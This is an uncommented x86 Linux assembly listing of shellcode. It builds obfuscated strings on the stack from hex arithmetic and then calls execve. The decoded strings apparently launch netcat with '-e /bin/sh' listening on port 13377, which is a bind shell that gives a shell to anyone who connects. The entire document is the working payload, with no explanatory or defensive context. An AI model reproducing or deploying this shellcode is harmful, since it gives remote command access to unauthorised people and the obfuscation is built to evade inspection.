global _start
section .text
    
_start:
	xor ebx,ebx
	mov eax,ebx
	mov edx,ebx
	mov eax, 0xeecefece 
	sub eax,0xb797cb9b
	push eax
	sub eax, 0x05c6bd06
	push eax
	mov edx, esp
	push ebx
	add eax, 0x3702b941
	push eax
	push 0x69622f65
	add eax, 0x0E033cbf
	push eax
	mov ecx,esp
	push ebx
	sub eax, 0x13083cfe
	push eax
	push ax
	push ax
	push 0x6e69622f
	mov ebx, esp
	xor eax,eax
	push eax
	push edx
	push ecx
	push ebx
	xor edx,edx
	mov  ecx,esp
	mov al,11
	int 0x80
